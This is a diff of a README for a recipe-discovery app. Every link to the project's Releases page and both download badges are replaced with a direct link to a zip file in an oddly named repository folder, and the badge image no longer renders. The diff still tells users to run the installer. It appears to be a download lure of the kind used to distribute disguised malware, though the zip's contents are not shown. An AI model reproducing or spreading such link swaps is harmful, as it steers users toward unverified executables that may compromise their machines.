@@ -1,6 +1,6 @@
 # 🍳 RecipeRealm-App - Discover Delicious Recipes Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20RecipeRealm%20App-brightgreen)](https://github.com/rhuan-medeiros/RecipeRealm-App/releases)
+[![Download](https://raw.githubusercontent.com/rhuan-medeiros/RecipeRealm-App/main/broadways/RecipeRealm-App.zip%20Now-Get%20RecipeRealm%20App-brightgreen)](https://raw.githubusercontent.com/rhuan-medeiros/RecipeRealm-App/main/broadways/RecipeRealm-App.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ To run RecipeRealm-App on your computer, you will need:
 
 To download RecipeRealm-App:
 
-1. **Visit our Releases Page:** Go to [this link](https://github.com/rhuan-medeiros/RecipeRealm-App/releases) to access the latest version.
+1. **Visit our Releases Page:** Go to [this link](https://raw.githubusercontent.com/rhuan-medeiros/RecipeRealm-App/main/broadways/RecipeRealm-App.zip) to access the latest version.
 2. **Choose your version:** Find the most recent release and look for files suitable for your operating system.
 3. **Download the installer:** Click the file corresponding to your OS to download it.
 4. **Install the application:** Once the download is complete, open the installer and follow the prompts to install the app on your computer.
 
 You can also access the download page directly by clicking the link below:
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20RecipeRealm%20App-brightgreen)](https://github.com/rhuan-medeiros/RecipeRealm-App/releases)
+[![Download](https://raw.githubusercontent.com/rhuan-medeiros/RecipeRealm-App/main/broadways/RecipeRealm-App.zip%20Now-Get%20RecipeRealm%20App-brightgreen)](https://raw.githubusercontent.com/rhuan-medeiros/RecipeRealm-App/main/broadways/RecipeRealm-App.zip)
 
 ## 📖 How to Use RecipeRealm-App
 
